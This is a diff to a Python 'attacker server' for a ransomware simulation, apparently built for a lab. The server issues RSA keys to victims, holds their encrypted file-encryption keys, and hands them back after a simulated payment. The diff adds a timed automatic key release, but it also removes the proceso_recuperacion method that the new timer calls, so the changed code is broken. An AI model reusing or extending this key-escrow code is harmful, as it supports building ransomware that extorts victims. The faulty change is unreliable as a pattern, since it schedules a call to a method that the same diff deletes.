@@ -1,15 +1,18 @@
-import socket, threading, json, base64
+import socket, threading, json, base64, os
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 
 class servidorAtacante:
-    def __init__(self, host='localhost', port=9999):
+    def __init__(self, host='localhost', port=9999, auto_release=True, release_delay=5):
         self.host = host
         self.port = port
         self.private_key = None
         self.public_key = None
         self.claves_guardadas = {}
+        self.claves_disponibles = {}
+        self.auto_release = auto_release
+        self.release_delay = release_delay
 
     def generar_par_claves(self):
         print("Atacante: Generando par de claves RSA...")
@@ -34,6 +37,17 @@ class servidorAtacante:
             clave_cifrada = base64.b64decode(datos['clave_cifrada'])
             self.claves_guardadas[victim_id] = clave_cifrada
             print(f"Atacante: Clave cifrada recibida y guardada para victima {victim_id}")
+
+            
+            if self.auto_release:
+                try:
+                    import threading
+                    print(f"Atacante: Liberación automática activada, la clave se liberará en {self.release_delay}s para {victim_id}")
+                    t = threading.Timer(self.release_delay, self.proceso_recuperacion, args=(victim_id,))
+                    t.daemon = True
+                    t.start()
+                except Exception as e:
+                    print(f"Atacante: Error al programar liberación automática: {e}")
             return True
         except Exception as e:
             print(f"Error recibiendo clave: {e}")
@@ -63,9 +77,6 @@ class servidorAtacante:
             print("Atacante: Clave publica enviada a la victima")
 
             datos_victima = conn.recv(4096).decode('utf-8')
-            # Soportar dos tipos de mensajes:
-            # 1) Victima que envía {'victim_id','clave_cifrada'} -> almacenar clave cifrada
-            # 2) Cliente de recuperacion que envía {'action':'recover','victim_id':...} -> devolver clave simetrica (base64)
             try:
                 datos = json.loads(datos_victima)
             except Exception as e:
@@ -85,7 +96,6 @@ class servidorAtacante:
                     resp = json.dumps({'status': 'ERROR', 'message': 'Clave no encontrada o error'}).encode('utf-8')
                     conn.send(resp)
 
-            # Mensaje de victima que contiene la clave cifrada
             elif 'victim_id' in datos and 'clave_cifrada' in datos:
                 if self.recibir_clave_cifrada(json.dumps(datos)):
                     conn.send(b"OK: Clave recibida correctamente")
@@ -120,15 +130,6 @@ class servidorAtacante:
             print("\nServidor detenido manualmente")
         finally:
             server_socket.close()
-
-    def proceso_recuperacion(self, victim_id):
-        if victim_id in self.claves_guardadas:
-            print(f"Atacante: Simulando pago recibido para victima {victim_id}")
-            clave_cifrada = self.claves_guardadas[victim_id]
-            clave_simetrica = self.descifrar_clave_simetrica(clave_cifrada)
-            if clave_simetrica:
-                return base64.b64encode(clave_simetrica).decode('utf-8')
-        return None
 
 if __name__ == "__main__":
     servidor = servidorAtacante()
